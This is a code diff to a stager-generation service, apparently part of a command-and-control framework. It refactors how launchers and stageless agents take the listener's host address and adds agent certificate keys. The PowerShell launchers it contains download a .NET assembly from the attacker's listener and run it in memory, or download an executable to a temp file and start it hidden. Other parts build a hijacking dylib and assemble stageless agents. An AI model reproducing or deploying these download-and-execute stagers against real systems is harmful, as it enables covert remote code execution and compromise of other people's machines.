@@ -200,14 +200,13 @@ class StagerGenerationService:
                 )
         else:
             hop = ""
-        host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
         launcher = f"""
         $wc=New-Object System.Net.WebClient;
-        $bytes=$wc.DownloadData("{host}/download/{language}/{hop}");
+        $bytes=$wc.DownloadData("{listener.host_address}download/{language}/{hop}");
         $assembly=[Reflection.Assembly]::load($bytes);
-        $assembly.GetType("Program").GetMethod("Main").Invoke($null, $null);
+        $assembly.EntryPoint.Invoke($null,$null);
         """
 
         launcher = helpers.strip_powershell_comments(launcher)
@@ -245,14 +244,13 @@ class StagerGenerationService:
                 )
         else:
             hop = ""
-        host = listener.options["Host"]["Value"]
         launcher_front = listener.options["Launcher"]["Value"]
 
         launcher = f"""
             # Create a temp file path
             $tempFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "{helpers.random_string(length=5)}.exe");
             $wc = New-Object System.Net.WebClient;
-            $url = "{host}/download/{language}/{hop}";
+            $url = "{listener.host_address}download/{language}/{hop}";
             $wc.DownloadFile($url, $tempFilePath);
             Start-Process -FilePath $tempFilePath -WindowStyle Hidden;
         """
@@ -370,8 +368,6 @@ class StagerGenerationService:
         """
         Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
-        import macholib.MachO
-
         MH_DYLIB = 6
         if hijacker.lower() == "true":
             if arch == "x86":
@@ -646,8 +642,6 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         return script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
     def generate_python_stageless(self, active_listener, language):
-        server = active_listener.options["Host"]["Value"]
-
         if language == "ironpython":
             language = "python"
             version = "ironpython"
@@ -667,7 +661,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
                 active_listener.options, language=language, encrypt=False, encode=False
             )
             .replace("exec(agent_code, globals())", "")
-            .replace("stage = Stage()", f"stage = Stage()\nserver='{server}'")
+            .replace(
+                "stage = Stage()",
+                f"stage = Stage()\nserver='{active_listener.host_address}'",
+            )
         )
 
         if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
@@ -685,18 +682,20 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             active_listener.options, language=language
         )
 
-        stager_code = active_listener.generate_stager(
-            active_listener.options, language=language, encrypt=False, encode=False
+        stager_code = (
+            active_listener.generate_stager(
+                active_listener.options, language=language, encrypt=False, encode=False
+            )
+            .replace("IEX ($e.GetString($agentBytes))", "")
+            .replace('Start-Negotiate -s "$ser"', 'Start-Negotiate -s "$Script:server"')
         )
 
-        launcher_code = active_listener.generate_launcher(
-            encode=False, language=language
-        ).replace(
-            "$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX",
-            "",
-        )
+        if active_listener.info["Name"] == "HTTP[S] MALLEABLE":
+            full_agent = "\n".join([agent_code, stager_code, comms_code])
+        else:
+            full_agent = "\n".join([agent_code, stager_code])
 
-        return "\n".join([launcher_code, comms_code, stager_code, agent_code])
+        return full_agent
 
     def generate_stageless(self, options):
         listener_name = options["Listener"]["Value"]
@@ -730,14 +729,10 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
         kill_date = active_listener.options["KillDate"]["Value"]
         working_hours = active_listener.options["WorkingHours"]["Value"]
         lost_limit = active_listener.options["DefaultLostLimit"]["Value"]
-        if "Host" in active_listener.options:
-            host = active_listener.options["Host"]["Value"]
-        else:
-            host = ""
 
         template_vars = {
             "PROFILE": profile,
-            "HOST": host,
+            "HOST": active_listener.host_address,
             "SESSION_ID": session_id,
             "KILL_DATE": kill_date,
             "WORKING_HOURS": working_hours,
@@ -749,6 +744,15 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
             ),
             "DEFAULT_RESPONSE": base64.b64encode(
                 active_listener.default_response().encode("UTF-8")
+            ).decode("UTF-8"),
+            "AGENT_PRIVATE_CERT_KEY": base64.b64encode(
+                active_listener.agent_private_cert_key
+            ).decode("UTF-8"),
+            "AGENT_PUBLIC_CERT_KEY": base64.b64encode(
+                active_listener.agent_public_cert_key
+            ).decode("UTF-8"),
+            "SERVER_PUBLIC_CERT_KEY": base64.b64encode(
+                active_listener.server_public_cert_key
             ).decode("UTF-8"),
         }
 
